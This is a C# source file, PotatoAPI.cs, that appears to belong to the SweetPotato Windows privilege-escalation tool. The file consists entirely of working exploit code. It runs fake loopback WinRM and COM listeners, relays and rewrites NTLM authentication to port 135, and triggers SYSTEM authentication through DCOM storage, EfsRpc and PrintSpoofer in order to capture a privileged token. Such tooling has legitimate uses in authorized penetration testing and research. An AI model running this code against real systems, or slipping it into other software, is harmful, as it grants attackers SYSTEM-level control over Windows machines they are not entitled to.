b'\xef\xbb\xbfusing System;\r\nusing System.Collections.Generic;\r\nusing System.Net;\r\nusing System.Net.Sockets;\r\nusing System.Text;\r\nusing System.Text.RegularExpressions;\r\nusing System.Threading;\r\n\r\nnamespace SweetPotato {\r\n\r\n    public enum ExecutionMethod {\r\n        Auto,\r\n        Token,\r\n        User\r\n    }\r\n\r\n    internal class PotatoAPI {\r\n\r\n        Thread comListener;\r\n        Thread winRMListener;\r\n        PrintSpoofer printSpoofer;\r\n        EfsRpc efsRpc;\r\n        LocalNegotiator negotiator = new LocalNegotiator();\r\n        Guid clsId;\r\n        readonly int port;\r\n        Mode mode;\r\n        volatile bool dcomComplete = false;\r\n\r\n        public enum Mode {\r\n            DCOM,\r\n            WinRM,\r\n            EfsRpc,\r\n            PrintSpoofer\r\n        }\r\n\r\n        public IntPtr Token {\r\n            get {\r\n                if (mode == Mode.DCOM || mode == Mode.WinRM) {\r\n                    return negotiator.Token;\r\n                } else if (mode == Mode.EfsRpc) {\r\n                    return efsRpc.Token;\r\n                } else {\r\n                    return printSpoofer.Token;\r\n                }   \r\n            }\r\n        }\r\n\r\n        EventWaitHandle readyEvent = new EventWaitHandle(false, EventResetMode.AutoReset);\r\n\r\n        public PotatoAPI(Guid clsId, ushort port, Mode mode) {\r\n\r\n            this.clsId = clsId;\r\n            this.port = port;\r\n            this.mode = mode;\r\n\r\n            switch (mode) {\r\n                case Mode.DCOM:\r\n                    StartCOMListenerThread();\r\n                    break;\r\n                case Mode.WinRM:\r\n                    StartWinRMThread();\r\n                    break;\r\n                case Mode.EfsRpc:\r\n                    efsRpc = new EfsRpc();\r\n                    break;\r\n                case Mode.PrintSpoofer:\r\n                    printSpoofer = new PrintSpoofer();\r\n                    break;\r\n            }                         \r\n        }\r\n\r\n        public Thread StartWinRMThread() {\r\n            winRMListener = new Thread(WinRMListener);\r\n            winRMListener.Start();\r\n            return winRMListener;\r\n        }\r\n\r\n        public Thread StartCOMListenerThread() {\r\n            comListener = new Thread(COMListener);\r\n            comListener.Start();\r\n            return comListener;\r\n        }\r\n\r\n        string GetAuthorizationHeader(Socket socket) {\r\n\r\n            byte[] buffer = new byte[8192];\r\n            int len = socket.Receive(buffer);\r\n\r\n            string authRequest = Encoding.ASCII.GetString(buffer);\r\n\r\n            Regex rx = new Regex(@"Authorization: Negotiate (?<neg>.*)");\r\n            MatchCollection matches = rx.Matches(authRequest);\r\n\r\n            if(matches.Count == 0) {\r\n                return null;\r\n            }\r\n\r\n            return matches[0].Groups["neg"].Value;           \r\n        }\r\n\r\n        void WinRMListener() {\r\n\r\n            Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n            listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);\r\n\r\n            listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, 5985));\r\n            listenSocket.Listen(10);\r\n            readyEvent.Set();\r\n\r\n            while (!listenSocket.Poll(100000, SelectMode.SelectRead)) {\r\n                if (dcomComplete)\r\n                    return;\r\n            }\r\n\r\n            Socket clientSocket = listenSocket.Accept();\r\n\r\n            string authHeader = GetAuthorizationHeader(clientSocket);\r\n\r\n            try {\r\n                if (!negotiator.HandleType1(Convert.FromBase64String(authHeader))) {\r\n                    Console.Write("[!] Failed to handle type SPNEGO");\r\n                    clientSocket.Close();\r\n                    listenSocket.Close();\r\n                    return;\r\n                }\r\n            } catch (FormatException) {\r\n                Console.Write("[!] Failed to parse SPNEGO Base64 buffer");\r\n                return;\r\n            }\r\n                        \r\n            string challengeResponse = String.Format(\r\n                "HTTP/1.1 401 Unauthorized\\n" +\r\n                "WWW-Authenticate: Negotiate {0}\\n" +\r\n                "Content-Length: 0\\n" +\r\n                "Connection: Keep-Alive\\n\\n",\r\n                Convert.ToBase64String(negotiator.Challenge)\r\n                ); \r\n\r\n            clientSocket.Send(Encoding.ASCII.GetBytes(challengeResponse));\r\n            authHeader = GetAuthorizationHeader(clientSocket);\r\n\r\n            try {\r\n                negotiator.HandleType3(Convert.FromBase64String(authHeader));\r\n            } catch (FormatException) {\r\n                Console.WriteLine("[!] Failed to parse SPNEGO Auth packet");\r\n            }\r\n\r\n            clientSocket.Close();\r\n            listenSocket.Close();\r\n        }\r\n\r\n        void COMListener() {\r\n\r\n            try {\r\n                Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n                listenSocket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, 1);\r\n\r\n                listenSocket.Bind(new IPEndPoint(IPAddress.Loopback, port));\r\n                listenSocket.Listen(10);\r\n                readyEvent.Set();\r\n\r\n                while (!listenSocket.Poll(100000, SelectMode.SelectRead)) {\r\n                    if (dcomComplete)\r\n                        return;\r\n                }\r\n\r\n                Socket clientSocket = listenSocket.Accept();\r\n                Socket rpcSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n                rpcSocket.Connect(new IPEndPoint(IPAddress.Loopback, 135));\r\n\r\n                byte[] buffer = new byte[4096];\r\n                int recvLen = 0;\r\n                int sendLen = 0;\r\n\r\n                while ((recvLen = clientSocket.Receive(buffer)) > 0) {\r\n                    byte[] received = new byte[recvLen];\r\n                    Array.Copy(buffer, received, received.Length);\r\n\r\n                    ProcessNTLMBytes(received);\r\n\r\n                    if (negotiator.Authenticated) {\r\n                        break;\r\n                    }\r\n\r\n                    sendLen = rpcSocket.Send(received);\r\n                    recvLen = rpcSocket.Receive(buffer);\r\n\r\n                    if (recvLen == 0) {\r\n                        break;\r\n                    }\r\n\r\n                    received = new byte[recvLen];\r\n                    Array.Copy(buffer, received, received.Length);\r\n\r\n                    ProcessNTLMBytes(received);\r\n                    sendLen = clientSocket.Send(received);\r\n\r\n                    if (listenSocket.Poll(100000, SelectMode.SelectRead)) {\r\n                        clientSocket.Close();\r\n                        clientSocket = listenSocket.Accept();\r\n                        rpcSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\r\n                        rpcSocket.Connect(new IPEndPoint(IPAddress.Loopback, 135));\r\n                    }\r\n                }\r\n\r\n                try {\r\n                    clientSocket.Close();\r\n                    rpcSocket.Close();\r\n                    listenSocket.Close();\r\n                } finally { }\r\n                                   \r\n            } catch (Exception e) {\r\n                Console.WriteLine("[!] COM Listener thread failed: {0}", e.Message);\r\n                readyEvent.Set();\r\n            }\r\n        }\r\n\r\n        public bool Trigger() {\r\n\r\n            bool result = false;\r\n\r\n            try {\r\n\r\n                switch (mode) {\r\n\r\n                    case Mode.DCOM:\r\n\r\n                        Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);\r\n                        Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);\r\n                        StorageTrigger storageTrigger = new StorageTrigger(storage, string.Format("127.0.0.1[{0}]", port), TowerProtocol.EPM_PROTOCOL_TCP);\r\n\r\n                        Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];\r\n                        qis[0].pIID = Ole32.IID_IUnknownPtr;\r\n\r\n                        Ole32.CoGetInstanceFromIStorage(null, ref clsId, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);\r\n                        result = negotiator.Authenticated;\r\n                        break;\r\n\r\n                    case Mode.WinRM:\r\n\r\n                        Type comType = Type.GetTypeFromCLSID(clsId);\r\n                        var instance = Activator.CreateInstance(comType);\r\n                        result = negotiator.Authenticated;\r\n                        break;\r\n\r\n                    case Mode.EfsRpc:\r\n\r\n                        efsRpc.TriggerEfsRpc();\r\n                        if(efsRpc.Token != IntPtr.Zero) {\r\n                            result = true;\r\n                        }\r\n                        break;\r\n\r\n                    case Mode.PrintSpoofer:\r\n\r\n                        printSpoofer.TriggerPrintSpoofer();\r\n                        if(printSpoofer.Token != IntPtr.Zero) {\r\n                            result = true;\r\n                        }\r\n                        break;\r\n                }\r\n          \r\n            } catch (Exception e) {\r\n                if (!negotiator.Authenticated)\r\n                    Console.Write(String.Format("{0}\\n", e.Message));\r\n            }\r\n\r\n            dcomComplete = true;\r\n            return result;\r\n        }\r\n\r\n        int FindNTLMBytes(byte[] bytes) {\r\n            //Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.\r\n            //The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,\r\n            //we can just return the index\r\n            byte[] pattern = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };\r\n            int pIdx = 0;\r\n            int i;\r\n            for (i = 0; i < bytes.Length; i++) {\r\n                if (bytes[i] == pattern[pIdx]) {\r\n                    pIdx = pIdx + 1;\r\n                    if (pIdx == 7) return (i - 6);\r\n                } else {\r\n                    pIdx = 0;\r\n                }\r\n            }\r\n            return -1;\r\n        }\r\n\r\n        int ProcessNTLMBytes(byte[] bytes) {\r\n\r\n            int ntlmLoc = FindNTLMBytes(bytes);\r\n            if (ntlmLoc == -1) return -1;\r\n\r\n            byte[] ntlm = new byte[bytes.Length - ntlmLoc];\r\n            Array.Copy(bytes, ntlmLoc, ntlm, 0, ntlm.Length);\r\n\r\n            int messageType = bytes[ntlmLoc + 8];\r\n            switch (messageType) {\r\n                case 1:\r\n                    //NTLM type 1 message\r\n                    negotiator.HandleType1(ntlm);\r\n                    return 0;\r\n                case 2:\r\n                    //NTLM type 2 message\r\n                    int result = negotiator.HandleType2(ntlm);\r\n                    Array.Copy(ntlm, 0, bytes, ntlmLoc, ntlm.Length);\r\n                    return result;\r\n\r\n                case 3:\r\n                    //NTLM type 3 message\r\n                    return negotiator.HandleType3(ntlm);\r\n                default:\r\n                    Console.WriteLine("Error - Unknown NTLM message type...");\r\n                    return -1;\r\n            }\r\n        }\r\n    }\r\n}\r\n'